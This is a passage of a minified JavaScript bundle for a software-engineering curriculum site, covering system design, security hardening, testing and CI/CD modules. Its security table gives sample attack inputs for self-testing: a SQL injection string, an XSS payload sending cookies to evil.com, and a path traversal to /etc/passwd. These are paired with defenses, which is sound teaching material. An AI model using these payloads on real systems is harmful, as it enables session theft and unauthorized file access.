CDN","Scale, cost, global edge cache","GCS, Azure Blob"],["Push Notifications","FCM + APNs","Platform-native delivery","OneSignal abstraction"]]},{type:"heading",text:"🔒 E2E Encryption Design"},{type:"bullets",items:["Each device generates an asymmetric key pair (Ed25519 for signing, X25519 for key exchange)","Public key uploaded to key server on first login","Signal Protocol: X3DH (Extended Triple Diffie-Hellman) for key establishment","Each message encrypted with a unique AES-256-GCM key derived via Diffie-Hellman","Server never sees plaintext — it only routes ciphertext","Forward secrecy: compromise of long-term key doesn't expose past messages"]},{type:"heading",text:"💻 Build This (Simplified Version)"},{type:"task",title:"Build a 1-1 Chat System",steps:["Design the messages table: id, conversation_id, sender_id, content, type, status, created_at.","Build WebSocket chat endpoint. Two clients can send messages to each other in real-time.",'Add delivery receipts: when recipient receives a message, send back {type: "delivered", message_id}.','Add read receipts: when recipient opens a conversation, send back {type: "read", up_to_message_id}.',"Handle offline delivery: if recipient is offline, store the message. On reconnect, deliver pending messages.","Add group chat: conversation_id maps to multiple user_ids. Fan-out message to all members."]},{type:"heading",text:"🎨 Creative Design Challenge"},{type:"scenario",title:'"Disappearing Messages" Feature',problem:"Design a message that auto-deletes after 24 hours (like Snapchat stories). The message must also delete from recipient's device, and there should be no server copy after deletion.",solution:'Store message with expires_at timestamp. A cleanup job deletes from DB after TTL. Send a WebSocket event {type: "message_deleted", message_id} to all participants. Clients must honor this event and remove from local storage. Cannot prevent screenshots — add a screenshot notification event.'}]},{id:20,title:"Design a UPI Payment System",week:"Week 20",goal:"Design the complete money movement architecture: VPA resolution, payment rails, fraud detection.",tags:["System Design","UPI","NPCI","Fraud Detection","Idempotency"],content:[{type:"heading",text:"🎯 Requirements"},{type:"bullets",items:["Functional: P2P transfers, QR code payments, merchant payments, bank account linking, transaction history","Non-functional: 99.99% uptime, < 5s transaction completion, idempotent (no double charges), fraud detection in < 200ms","Regulatory: NPCI compliance, RBI guidelines, KYC requirements, audit logs for 10 years"]},{type:"heading",text:"🗺 System Design Breakdown"},{type:"table",headers:["Service","Responsibility","Key Challenge"],rows:[["VPA Service","Resolve user@bank → actual bank account","Latency to NPCI + caching"],["Payment Initiation","Create payment intent, validate","Idempotency across retries"],["Transaction Orchestrator","Coordinate debit + credit + NPCI call","Partial failure recovery"],["Fraud Detection","Real-time score before every payment","Sub-200ms ML inference"],["Settlement Service","Net positions, batch settlement to NPCI","Reconciliation + disputes"],["Notification Service","SMS + push for all transactions","At-least-once delivery"]]},{type:"heading",text:"🔐 Fraud Detection System Design"},{type:"bullets",items:["Rule engine (runs in < 10ms): velocity checks, blacklist, amount limits, time-of-day patterns","ML scoring (runs in < 150ms): ensemble model on device fingerprint, location, transaction history","Decision: score < 30 → auto-approve. 30-70 → step-up verification. > 70 → block + flag for review.","Features used: transaction amount, merchant category, geolocation, device trust score, historical patterns","False positive handling: allow user to challenge, review within 24h, refund automatically"]},{type:"heading",text:"💻 Build This (Simplified)"},{type:"task",title:"Build Core Payment Flow",steps:["Build POST /payments/initiate — validates amount, checks balance, creates payment_intent.","Build POST /payments/:id/execute — actually moves money atomically. Returns immediately with status.","Build GET /payments/:id/status — webhook + polling for payment status.","Implement the fraud rule engine: velocity check (> 5 payments/hour = flag), amount limit check.","Test: payment succeeds on first try. Same idempotency key on retry → same result, no double charge.","Test: simulate NPCI timeout — payment must roll back cleanly and retry-able."]}]},{id:21,title:"Design YouTube / Video Streaming",week:"Week 21",goal:"Design video upload, transcoding, adaptive streaming, and global CDN delivery at massive scale.",tags:["System Design","HLS","CDN","Transcoding","DAG Pipeline"],content:[{type:"heading",text:"🎯 Requirements"},{type:"bullets",items:["500 hours of video uploaded per minute. 1B video views per day.","Adaptive bitrate streaming: 360p, 720p, 1080p, 4K based on connection speed","Video available < 2 minutes after upload completes (fast track for short videos)","Global delivery via CDN: < 500ms to start playing anywhere in the world"]},{type:"heading",text:"🗺 Video Processing Pipeline (DAG)"},{type:"bullets",items:["Step 1: Upload → chunked upload to S3 (raw bucket). Generate presigned multipart URL.","Step 2: Trigger → S3 event → SQS → Transcoding service picks up job.","Step 3: Transcode → FFmpeg in parallel workers: generate 360p, 720p, 1080p HLS segments simultaneously.","Step 4: Thumbnail → extract frame at 10%, 50%, 90% of video. Auto-select best (ML brightness/face detection).",'Step 5: Publish → move transcoded segments to CDN-backed S3 bucket. Update video status = "ready".',"Step 6: Notify → WebSocket push to uploader that video is live."]},{type:"heading",text:"📺 Adaptive Streaming with HLS"},{type:"code",text:`# HLS master playlist (generated after transcoding)
# video_abc123/master.m3u8
#EXTM3U
#EXT-X-VERSION:3

#EXT-X-STREAM-INF:BANDWIDTH=500000,RESOLUTION=640x360
360p/playlist.m3u8

#EXT-X-STREAM-INF:BANDWIDTH=2000000,RESOLUTION=1280x720
720p/playlist.m3u8

#EXT-X-STREAM-INF:BANDWIDTH=5000000,RESOLUTION=1920x1080
1080p/playlist.m3u8

# The video player (hls.js) auto-selects quality based on measured bandwidth
# Switches quality mid-playback seamlessly
# CDN serves each segment from the edge nearest the viewer`},{type:"heading",text:"💻 Build This (Simplified)"},{type:"task",title:"Build Video Upload Pipeline",steps:['Set up chunked video upload: client splits video into 10MB chunks, uploads each with presigned URL, signals "complete".',"Trigger transcoding job on upload completion using Celery.","Install FFmpeg. Transcode uploaded video to 360p HLS segments.","Serve HLS segments from MinIO. Test with hls.js player in browser.","Add upload progress tracking: each chunk completion updates progress in Redis, client polls /uploads/:id/progress."]}]},{id:22,title:"Design Twitter Feed / Social Graph",week:"Week 21",goal:"Fan-out on write vs fan-out on read. News feed at scale. Graph traversal for follow recommendations.",tags:["System Design","Fan-out","Social Graph","Timeline","Cache"],content:[{type:"heading",text:"🗺 The Core Challenge: News Feed"},{type:"para",text:"When User A posts a tweet, their 10M followers should see it in their feed. Two approaches:"},{type:"table",headers:["Approach","How It Works","Best For","Problem"],rows:[["Fan-out on Write","Push tweet to all followers' precomputed feeds on publish","Celebrities with few followers reading","Kylie Jenner has 400M followers — 400M writes on every tweet"],["Fan-out on Read","Pull tweets from followed users on feed load","Celebrities writing, few followers reading","Reading from 1000 followed users means 1000 DB queries per feed load"],["Hybrid (real systems)","Fan-out to active users, pull for inactive + celebrities","Twitter, Instagram","Complex to implement correctly"]]},{type:"heading",text:"💻 Build This"},{type:"task",title:"Build a Twitter-Like Feed",steps:["Build the social graph: followers table with follower_id, followed_id, created_at.","Implement fan-out on write: on new post, find all followers, write post_id to each follower's feed (Redis LPUSH).","Build GET /feed — reads from user's precomputed Redis list, fetches post details.","Handle celebrity problem: if user has > 1000 followers, use fan-out on read for them instead.",'Build follow recommendations: "People you may know" — 2nd-degree connections (friends of friends, SQL query with CTEs).',"Add engagement counters: likes, retweets — use Redis INCR for fast counting, sync to DB every minute."]}]}]},T={id:8,title:"Security, Testing & DevOps",subtitle:"Weeks 22-24 · Ship with confidence. Defend at every layer.",color:"#dc2626",emoji:"🛡️",modules:[{id:23,title:"Security Hardening: Attack & Defend",week:"Week 22",goal:"Understand every major attack vector and implement defenses. Then attack your own app.",tags:["OWASP","SQL Injection","IDOR","XSS","CSRF","Secrets Management"],content:[{type:"heading",text:"🗺 Attack Surface Map — Build This First"},{type:"para",text:"Before hardening, map every entry point an attacker could use. Draw it."},{type:"bullets",items:["Auth endpoints: OTP brute force, session fixation, replay attacks","File uploads: malware upload, MIME bypass, path traversal","API endpoints: IDOR (access other users' data), mass assignment, rate limit bypass","Frontend: XSS via user-generated content, clickjacking, CSRF on state-changing requests","Infrastructure: exposed admin panels, debug endpoints, misconfigured S3 buckets","Secrets: hardcoded API keys, leaked .env files, insufficiently restricted IAM roles"]},{type:"table",headers:["Attack","How to Reproduce","How to Prevent","How to Detect"],rows:[["SQL Injection","Input: ' OR 1=1-- in search field","SQLAlchemy parameterized queries (always)","WAF + log anomalous queries"],["IDOR","GET /notes/other_user_note_id while logged in as different user","Check ownership: notes.user_id == current_user.id on EVERY endpoint","Log and alert on 403 spikes"],["XSS","Post a comment: <script>document.location='evil.com?c='+document.cookie<\/script>","React escapes by default. Set strict CSP headers. Sanitize HTML with DOMPurify.","CSP violation reports"],["CSRF","Forge a cross-origin form POST to /payments/transfer","SameSite=Strict on session cookies. CSRF token for forms.","Compare Origin header"],["Path Traversal","Filename: ../../../../etc/passwd","Never use user filename as path. Always UUID storage keys.","Validate path is inside allowed directory"],["Mass Assignment","PATCH /users/me {is_admin: true}","Use explicit Pydantic response schemas. Never expose internal fields.","Audit schema definitions"]]},{type:"heading",text:"💻 Practical Task: Penetration Test Your Own App"},{type:"task",title:"Red Team Your App",steps:["IDOR test: create 2 accounts. Log in as account 1. Try to access every account 2 resource. Fix any that succeed.","Injection test: input SQL fragments into every text field. Input JS script tags into every text field.","Auth bypass: try every endpoint without a token, with an expired token, with a token from a deleted user.","Rate limit bypass: try sending requests from different IPs, with different User-Agents.","File upload bypass: rename a .php file as .jpg. Upload it. Try to execute it via the download URL.","Run OWASP ZAP (free) against your local app. Fix all high and medium severity findings.",'Check your git history for any accidentally committed secrets: git log --all -p | grep -i "password\\|secret\\|key"']}]},{id:24,title:"Testing Strategy: Pyramid to Production",week:"Week 23",goal:"Write tests that actually catch bugs. 80%+ coverage. Fast enough to run on every commit.",tags:["pytest","httpx","Factories","Contract Testing","Load Testing","Chaos Engineering"],content:[{type:"heading",text:"🗺 Test Pyramid"},{type:"table",headers:["Level","What to Test","% of Tests","Speed","Tools"],rows:[["Unit","Business logic functions, validators, helpers","60%","< 1ms","pytest, unittest.mock"],["Integration","Full HTTP request, real DB (test transactions), real Redis","30%","100-500ms","pytest + httpx + asyncpg"],["Contract","API response shape matches OpenAPI spec","5%","< 10ms","schemathesis, openapi-spec-validator"],["E2E","Critical user flows in real browser","4%","5-30s","Playwright"],["Load","Performance under realistic traffic","1%","Minutes","Locust, k6"]]},{type:"code",text:`# Complete integration test pattern
import pytest
import pytest_asyncio
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession

# Factories for test data (use factory_boy)
class UserFactory(factory.Factory):
    class Meta:
        model = User
    id = factory.LazyFunction(uuid4)
    phone = factory.Sequence(lambda n: f'+91{9000000000 + n}')
    name = factory.Faker('name')

# Test fixture: fresh DB for each test (uses transactions for rollback)
@pytest_asyncio.fixture
async def db(engine):
    async with engine.connect() as conn:
        await conn.begin()
        async with AsyncSession(conn) as session:
            yield session
        await conn.rollback()

# Test fixture: authenticated client
@pytest_asyncio.fixture
async def auth_client(app, db):
    user = UserFactory.build()
    db.add(user)
    await db.flush()
    token = create_access_token(user_id=str(user.id))
    async with AsyncClient(app=app, base_url='http://test') as client:
        client.headers['Authorization'] = f'Bearer {token}'
        yield client, user

# Real integration test
async def test_create_note_and_search(auth_client, db):
    client, user = auth_client

    # Create a note
    resp = await client.post('/v1/notes', json={
        'title': 'Payment Invoice',
        'body': 'Invoice for November services'
    })
    assert resp.status_code == 201
    note_id = resp.json()['id']

    # Search for it
    resp = await client.get('/v1/notes/search?q=invoice')
    assert resp.status_code == 200
    results = resp.json()['data']
    assert any(r['id'] == note_id for r in results)

# Concurrency test
async def test_transfer_concurrent_insufficient_funds(auth_client, db):
    client, user = auth_client
    # Create account with ₹100
    await create_account(db, user.id, balance=Decimal('100'))

    # Two simultaneous ₹80 transfers
    results = await asyncio.gather(
        client.post('/v1/transfers', json={'amount': 80, 'to': 'other_user', 'key': str(uuid4())}),
        client.post('/v1/transfers', json={'amount': 80, 'to': 'other_user', 'key': str(uuid4())}),
        return_exceptions=True
    )

    statuses = [r.status_code for r in results]
    assert statuses.count(200) == 1, "Exactly one transfer should succeed"
    assert statuses.count(422) == 1, "One should fail with InsufficientFunds"`},{type:"heading",text:"🎨 Chaos Engineering Challenge"},{type:"scenario",title:"Kill Dependencies Mid-Request",problem:"Your system looks fine in testing. But what happens when Redis dies during a payment? When the DB goes away mid-transfer? When the S3 bucket returns 503?",solution:'Use Toxiproxy (docker) to inject failures: add 500ms latency, drop connections, return errors. Run your integration tests against a "broken" environment. Every endpoint must have a documented behavior for each failure mode. Fix the ones that return 500 instead of graceful degradation.'}]},{id:25,title:"CI/CD, Docker & Zero-Downtime Deploy",week:"Week 24",goal:"Ship code with confidence. Rollback in 2 minutes. Never take down production for a deploy.",tags:["Docker","GitHub Actions","Blue-Green","Canary","Nginx"],content:[{type:"heading",text:"🗺 Deployment Strategy Comparison"},{type:"table",headers:["Strategy","How It Works","Rollback Time","Infra Cost","When to Use"],rows:[["Recreate","Stop old, start new. Downtime between.","Re-deploy old","Low","Dev environments only"],["Rolling","Replace instances one by one. No downtime.","Re-deploy old","None extra","Stateless services"],["Blue-Green","Run 2 identical envs. Flip load balancer.","Seconds (flip LB)","Double infra","Critical services, DB migrations"],["Canary","Send 5% traffic to new, monitor, increase gradually","Adjust LB weights","Small extra","Large user bases, risky changes"],["Shadow","Mirror production traffic to new version, compare responses","None needed","Double","Major refactors, DB changes"]]},{type:"code",text:`# Production-ready Dockerfile (multi-stage)
FROM python:3.12-slim AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

FROM python:3.12-slim AS runtime
WORKDIR /app
# Security: don't run as root
RUN useradd -r -s /bin/false appuser
COPY --from=builder /usr/local/lib/python3.12/site-packages /usr/local/lib/python3.12/site-packages
COPY --from=builder /usr/local/bin /usr/local/bin
COPY . .
USER appuser
EXPOSE 8000
HEALTHCHECK --interval=30s --timeout=5s --retries=3 \\
  CMD curl -f http://localhost:8000/health || exit 1
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000", "--workers", "4"]

# GitHub Actions CI/CD pipeline
# .github/workflows/deploy.yml
on:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:15
        env: {POSTGRES_PASSWORD: test}
      redis:
        image: redis:7-alpine
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: {python-version: '3.12'}
      - run: pip install -r requirements.txt
      - run: alembic upgrade head
      - run: pytest -v --cov=app --cov-fail-under=80 --cov-report=xml
      - run: python scripts/validate_openapi.py
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Build and push Docker image
        run: |
          docker build -t myapp:$GITHUB_SHA .
          docker push registry/myapp:$GITHUB_SHA
      - name: Blue-green deploy
        run: |
          # Deploy to green environment
          kubectl set image deployment/app-green app=registry/myapp:$GITHUB_SHA
          kubectl rollout status deployment/app-green
          # Smoke test green
          curl -f https://green.internal/health
          # Flip traffic
          kubectl patch service app-lb -p '{"spec":{"selector":{"slot":"green"}}}'
          echo "Deployed to green, LB flipped"`},{type:"heading",text:"💻 Practical Task"},{type:"task",title:"Full CI/CD Pipeline",steps:["Write a multi-stage Dockerfile. Build it. Verify the image is < 200MB. Test the healthcheck.","Write docker-compose.yml for local dev: api + db + redis + worker + flower (Celery UI).","Set up GitHub Actions: on push to main, run tests, build image, push to registry.","Simulate a bad deploy: introduce a bug, push to main, watch CI catch it before deploy.","Implement a database migration strategy: migration runs automatically on deploy. Rollback if migration fails.","Test rollback: deploy a breaking change, detect it's bad, rollback within 2 minutes."]}]}]};function b(e){switch(e.type){case"heading":return`<h4 class="content-heading">${e.text}</h4>`;case"para":return`<p class="content-para">${e.text}</p>`;case"bullets":return`<ul class="bullet-list">${e.items.map(t=>`<li class="bullet-item"><span class="bullet-dot">▸</span><span>${t}</span></li>`).join("")}</ul>`;case"code":return`<div class="code-block"><pre><code>${_(e.text)}</code></pre></div>`;case"table":return`<div class="table-container">
        <table>
          <thead><tr>${e.headers.map(t=>`<th>${t}</th>`).join("")}</tr></thead>
          <tbody>${e.rows.map((t,i)=>`
            <tr class="${i%2===0?"row-even":"row-odd"}">
              ${t.map(n=>`<td>${n}</td>`).join("")}
            </tr>`).join("")}
          </tbody>
        </table>
      </div>`;case"info":return`<div class="info-box" style="border-left-color: ${e.color||"var(--primary)"}">
        <span class="info-label" style="color: ${e.color||"var(--primary)"}">${e.label}</span>
        <p>${e.text}</p>
      </div>`;case"task":return`<div class="task-box">
        <div class="task-header">📋 ${e.title}</div>
        <ol class="task-steps">${e.steps.map((t,i)=>`<li><span class="step-num">${i+1}</span><span>${t}</span></li>`).join("")}</ol>
      </div>`;case"scenario":return`<div class="scenario-box">
        <div class="scenario-header">🎨 Creative Challenge: ${e.title}</div>
        <div class="scenario-problem"><strong>Problem:</strong> ${e.problem}</div>
        <div class="scenario-solution"><strong>Solution:</strong> ${e.solution}</div>
      </div>`;case"checklist":return`<div class="checklist-box">
        <div class="checklist-title">🔥 ${e.title}</div>
        <ul class="checklist">${e.items.map((t,i)=>`
            <li class="check-item" data-check="${i}">
              <input type="checkbox" class="check-input" onchange="this.closest('li').classList.toggle('checked', this.checked)">
              <span>${t}</span>
            </li>`).join("")}</ul>
      </div>`;default:return""}}function _(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;")}function v(e){return`
    <section id="phase-${e.id}" class="phase-section" style="--phase-color: ${e.color}">
      <div class="phase-header">
        <div class="phase-label-row">
          <span class="phase-emoji">${e.emoji}</span>
          <span class="phase-tag" style="background: ${e.color}">Phase ${e.id}</span>
          <span class="phase-module-count">${e.modules.length} modules</span>
        </div>
        <h2 class="phase-title">${e.title}</h2>
        <p class="phase-subtitle">${e.subtitle}</p>
      </div>

      <div class="module-grid">
        ${e.modules.map(t=>`
          <article class="module-card" id="mod-${t.id}" style="--accent: ${e.color}">
            <div class="module-card-accent"></div>
            <div class="module-inner">
              <div class="module-head">
                <div class="module-meta-row">
                  <span class="module-number">Module ${t.id}</span>
                  <span class="module-week">${t.week}</span>
                </div>
                <h3 class="module-title">${t.title}</h3>
                <p class="module-goal">${t.goal}</p>
                <div class="tag-row">${t.tags.map(i=>`<span class="tag">${i}</span>`).join("")}</div>
              </div>

              <div class="module-body">
                ${t.content.map(i=>b(i)).join("")}
              </div>

              <div class="module-foot">
                <button class="complete-btn" id="btn-${t.id}" onclick="toggleComplete(${t.id})">
                  <span class="btn-icon">○</span>
                  <span class="btn-text">Mark Complete</span>
                </button>
              </div>
            </div>
          </article>
        `).join("")}
      </div>
    </section>
  `}function E(e){return e.map(t=>`
    <a href="#phase-${t.id}" class="nav-item" data-phase="${t.id}">
      <span class="nav-dot" style="color: ${t.color}">${t.emoji}</span>
      <span class="nav-text">
        <span class="nav-phase-num">Phase ${t.id}</span>
        <span class="nav-phase-name">${t.title.split(" — ")[0].split(":")[0]}</span>
      </span>
    </a>
  `).join("")}const o=[u,p,m,h,y,g,f,T],l=o.reduce((e,t)=>e+t.modules.length,0);function c(){return JSON.parse(localStorage.getItem("curriculum_completed")||"[]")}function k(e){localStorage.setItem("curriculum_completed",JSON.stringify(e))}function d(){const e=c(),t=Math.round(e.length/l*100),i=document.getElementById("progress-fill"),n=document.getElementById("progress-text");i&&(i.style.width=`${t}%`),n&&(n.textContent=`${t}% — ${e.length}/${l} modules`),e.forEach(s=>{const a=document.getElementById(`btn-${s}`);a&&(a.classList.add("completed"),a.querySelector(".btn-icon").textContent="✓",a.querySelector(".btn-text").textContent="Completed")})}window.toggleComplete=e=>{const t=c(),i=t.indexOf(e);i>-1?t.splice(i,1):t.push(e),k(t);const n=document.getElementById(`btn-${e}`);if(n){const s=t.includes(e);n.classList.toggle("completed",s),n.querySelector(".btn-icon").textContent=s?"✓":"○",n.querySelector(".btn-text").textContent=s?"Completed":"Mark Complete"}d()};function w(){const e=document.querySelectorAll(".phase-section"),t=document.querySelectorAll(".nav-item"),i=new IntersectionObserver(n=>{n.forEach(s=>{if(s.isIntersecting){const a=s.target.id;t.forEach(r=>{r.classList.toggle("active",r.getAttribute("href")===`#${a}`)})}})},{rootMargin:"-20% 0px -70% 0px"});e.forEach(n=>i.observe(n))}function S(){const e=document.getElementById("theme-toggle"),t=localStorage.getItem("theme")||"light";document.documentElement.setAttribute("data-theme",t),e&&(e.textContent=t==="dark"?"☀️":"🌙"),e==null||e.addEventListener("click",()=>{const i=document.documentElement.getAttribute("data-theme")==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",i),localStorage.setItem("theme",i),e&&(e.textContent=i==="dark"?"☀️":"🌙")})}function A(){const e=document.getElementById("search-input");e&&e.addEventListener("input",()=>{const t=e.value.toLowerCase().trim();document.querySelectorAll(".module-card").forEach(n=>{var a;const s=((a=n.textContent)==null?void 0:a.toLowerCase())||"";n.style.display=t===""||s.includes(t)?"":"none"})})}function L(){const e=document.getElementById("phase-nav");e&&(e.innerHTML=E(o));const t=document.getElementById("curriculum-content");t&&(t.innerHTML=o.map(v).join("")),w(),S(),A(),d()}document.addEventListener("DOMContentLoaded",L);
